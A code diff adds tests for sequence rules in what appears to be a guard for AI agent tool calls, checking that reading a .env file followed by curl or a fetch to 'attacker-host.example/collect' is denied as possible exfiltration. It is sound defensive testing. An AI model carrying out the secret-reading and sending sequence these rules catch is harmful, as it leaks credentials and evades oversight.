@@ -214,6 +214,82 @@ rules:
   })
 })
 
+describe('sequence rule match surface (type: sequence)', () => {
+  // This WAS red before the sequencer.ts fix (Wave-2 Lane 5, same class as
+  // the rate/diagnosis fix above): SequenceDetector.matchesTool built its
+  // pattern haystack as `JSON.stringify(args)` only, so an anchored/quoted
+  // command pattern on a step could silently never match — the sequence
+  // step is satisfied but the detector never notices, and the whole
+  // sequence rule falls silent.
+  it('matches a quoted command against an end-anchored step pattern (was red before the fix)', async () => {
+    const pipeline = makePipeline(`version: 1
+rules:
+  - id: env-then-curl
+    type: sequence
+    steps:
+      - tool: Bash
+        pattern: "cat .env$"
+      - tool: Bash
+        pattern: "curl "
+    sequence_window_seconds: 60
+    action: deny
+    message: "Reading .env then making a network call is a possible exfil sequence."
+`)
+    await pipeline.evaluate(input('Bash', { command: 'echo "x" && cat .env' }, 'seq-quoted'))
+    const result = await pipeline.evaluate(input('Bash', { command: 'curl https://example.com' }, 'seq-quoted'))
+    // Before the fix this stayed 'allow' forever — the first step's
+    // anchored pattern never matched the raw-JSON haystack, so the
+    // sequence never armed.
+    expect(result.action).not.toBe('allow')
+    expect(result.rule_id).toBe('env-then-curl')
+  })
+
+  // Regression guard: a step pattern matching a NON-command arg value (the
+  // existing JSON.stringify surface, e.g. a URL embedded in a WebFetch-style
+  // call) must keep matching — the command-string surface is additive, not
+  // a replacement.
+  it('still matches a step pattern against a non-command arg value via the JSON fallback (regression guard)', async () => {
+    const pipeline = makePipeline(`version: 1
+rules:
+  - id: read-env-then-fetch
+    type: sequence
+    steps:
+      - tool: Read
+        path: ".env"
+      - tool: WebFetch
+        pattern: "attacker-host"
+    sequence_window_seconds: 60
+    action: deny
+    message: "Reading .env then fetching an external host is a possible exfil sequence."
+`)
+    await pipeline.evaluate(input('Read', { path: '.env' }, 'seq-json-fallback'))
+    const result = await pipeline.evaluate(input('WebFetch', { url: 'https://attacker-host.example/collect' }, 'seq-json-fallback'))
+    expect(result.action).not.toBe('allow')
+    expect(result.rule_id).toBe('read-env-then-fetch')
+  })
+
+  // Must-allow: a benign second step must not spuriously complete the
+  // sequence.
+  it('does not complete the sequence for a benign step (must-allow)', async () => {
+    const pipeline = makePipeline(`version: 1
+rules:
+  - id: env-then-curl-2
+    type: sequence
+    steps:
+      - tool: Bash
+        pattern: "cat .env$"
+      - tool: Bash
+        pattern: "curl "
+    sequence_window_seconds: 60
+    action: deny
+    message: "Reading .env then making a network call is a possible exfil sequence."
+`)
+    await pipeline.evaluate(input('Bash', { command: 'echo "x" && cat .env' }, 'seq-benign'))
+    const result = await pipeline.evaluate(input('Bash', { command: 'npm test' }, 'seq-benign'))
+    expect(result.action).toBe('allow')
+  })
+})
+
 describe('diagnosis rule match surface (type: diagnosis)', () => {
   // Guard against a naive fix: diagnosis rules intentionally match the
   // CONTENT of a write (e.g. "refactor" inside the new file body), not a
